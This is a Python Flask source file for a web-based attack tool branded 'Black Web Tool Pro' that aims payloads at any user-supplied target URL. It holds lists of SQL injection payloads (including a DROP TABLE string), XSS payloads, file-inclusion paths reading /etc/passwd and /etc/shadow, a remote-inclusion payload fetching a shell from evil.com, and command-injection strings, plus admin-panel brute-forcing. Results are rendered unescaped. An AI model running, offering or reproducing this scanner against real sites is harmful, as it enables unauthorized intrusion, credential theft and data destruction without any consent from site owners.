from flask import Flask, render_template_string, request
import requests
from concurrent.futures import ThreadPoolExecutor
import time

app = Flask(__name__)

HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🖤 Black Web Tool Pro</title>
    <style>
        body{background:#0a0e17;color:#00ffcc;font-family:monospace;padding:20px}
        .box{max-width:950px;margin:auto;background:#111927;padding:25px;border-radius:15px;border:1px solid #00ffcc33}
        h1{text-align:center;color:#ff0044;text-shadow:0 0 20px #ff004488}
        .sub{text-align:center;color:#886688;font-size:14px}
        input,button{width:100%;padding:12px;margin:6px 0;border-radius:8px;border:1px solid #334466;background:#0b111e;color:#c0d4ff}
        button{background:#ff004422;border-color:#ff0044;cursor:pointer;font-weight:bold}
        button:hover{background:#ff004466}
        .result{background:#0d1520;padding:15px;border-radius:8px;white-space:pre-wrap;color:#ffccbb;max-height:500px;overflow:auto;margin-top:10px}
        .badge{color:#ff0044;font-weight:bold}
        .row{display:flex;gap:10px;flex-wrap:wrap}
        .row input{flex:1}
        .row button{flex:0 0 auto;width:auto;padding:12px 25px}
    </style>
</head>
<body>
<div class="box">
    <h1>🖤 Black Web Tool Pro</h1>
    <div class="sub">Developer Arif • v3.0 • <span class="badge">#HardMode</span></div>
    <form method="POST" action="/scan">
        <div class="row">
            <input type="text" name="url" placeholder="http://target.com" required>
            <input type="text" name="param" placeholder="প্যারামিটার (যেমন: id, q)" value="id">
            <button type="submit">🚀 Scan</button>
        </div>
    </form>
    {% if result %}
    <div class="result">{{ result|safe }}</div>
    {% endif %}
</div>
</body>
</html>
"""

# ===== অ্যাডমিন প্যানেল লিস্ট =====
admin_paths = [
    '/admin','/admin.php','/login','/wp-admin','/administrator',
    '/panel','/dashboard','/admincp','/cpanel','/user','/auth',
    '/backend','/admin_area','/controlpanel','/manage','/siteadmin',
    '/master','/console','/setup','/install','/config','/sql',
    '/phpmyadmin','/mysql','/db','/logs','/backup','/old','/test'
]

# ===== SQLi পেলোড =====
sqli_payloads = [
    "'", "\"", "' OR '1'='1", "' OR '1'='1' --", "\" OR \"1\"=\"1",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "'; DROP TABLE users--", "' AND 1=1--", "' AND 1=2--"
]

# ===== XSS পেলোড =====
xss_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><script>alert(1)</script>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)"
]

# ===== LFI পেলোড =====
lfi_payloads = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../windows/win.ini",
    "../../../../boot.ini",
    "/etc/passwd"
]

# ===== RFI পেলোড =====
rfi_payloads = [
    "http://evil.com/shell.txt",
    "https://pastebin.com/raw/xxxx"
]

# ===== কমান্ড ইনজেকশন =====
cmd_payloads = [
    "; ls", "| whoami", "&& id", "| dir", "; cat /etc/passwd"
]

def scan_admin(url):
    found = []
    for p in admin_paths:
        try:
            r = requests.get(url.rstrip('/')+p, timeout=2, allow_redirects=False)
            if r.status_code in [200,301,302,401,403]:
                found.append(f"✅ অ্যাডমিন: {url.rstrip('/')+p} → {r.status_code}")
        except:
            pass
    return found

def scan_sqli(url, param):
    found = []
    for payload in sqli_payloads:
        try:
            test_url = f"{url}?{param}={payload}"
            r = requests.get(test_url, timeout=2)
            if any(x in r.text.lower() for x in ['mysql','sql','syntax','error','warning','ora-']):
                found.append(f"⚠️ SQLi: {test_url}")
                break
        except:
            pass
    return found

def scan_xss(url, param):
    found = []
    for payload in xss_payloads:
        try:
            test_url = f"{url}?{param}={payload}"
            r = requests.get(test_url, timeout=2)
            if payload in r.text:
                found.append(f"⚠️ XSS: {test_url}")
                break
        except:
            pass
    return found

def scan_lfi(url, param):
    found = []
    for payload in lfi_payloads:
        try:
            test_url = f"{url}?{param}={payload}"
            r = requests.get(test_url, timeout=2)
            if any(x in r.text.lower() for x in ['root:','admin:','[boot loader]','[fonts]']):
                found.append(f"⚠️ LFI: {test_url}")
                break
        except:
            pass
    return found

def scan_rfi(url, param):
    found = []
    for payload in rfi_payloads:
        try:
            test_url = f"{url}?{param}={payload}"
            r = requests.get(test_url, timeout=2)
            if 'shell' in r.text.lower() or 'evil' in r.text.lower():
                found.append(f"⚠️ RFI: {test_url}")
                break
        except:
            pass
    return found

def scan_cmd(url, param):
    found = []
    for payload in cmd_payloads:
        try:
            test_url = f"{url}?{param}={payload}"
            r = requests.get(test_url, timeout=2)
            if any(x in r.text.lower() for x in ['uid=','root','admin','user','nt authority']):
                found.append(f"⚠️ CMD Inj: {test_url}")
                break
        except:
            pass
    return found

@app.route('/', methods=['GET'])
def index():
    return render_template_string(HTML, result=None)

@app.route('/scan', methods=['POST'])
def scan():
    url = request.form.get('url','').strip()
    param = request.form.get('param','id').strip()
    if not url:
        return render_template_string(HTML, result="❌ URL দিন")
    if not url.startswith(('http://','https://')):
        url = 'http://' + url

    result_lines = []
    result_lines.append("🖤 স্ক্যান শুরু...\n")

    result_lines.append("\n[+] অ্যাডমিন প্যানেল...")
    result_lines.extend(scan_admin(url))

    if param:
        result_lines.append("\n[+] SQLi স্ক্যান...")
        result_lines.extend(scan_sqli(url, param))

        result_lines.append("\n[+] XSS স্ক্যান...")
        result_lines.extend(scan_xss(url, param))

        result_lines.append("\n[+] LFI স্ক্যান...")
        result_lines.extend(scan_lfi(url, param))

        result_lines.append("\n[+] RFI স্ক্যান...")
        result_lines.extend(scan_rfi(url, param))

        result_lines.append("\n[+] কমান্ড ইনজেকশন...")
        result_lines.extend(scan_cmd(url, param))

    result_lines.append("\n[✔] স্ক্যান সম্পূর্ণ।")
    return render_template_string(HTML, result="\n".join(result_lines))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)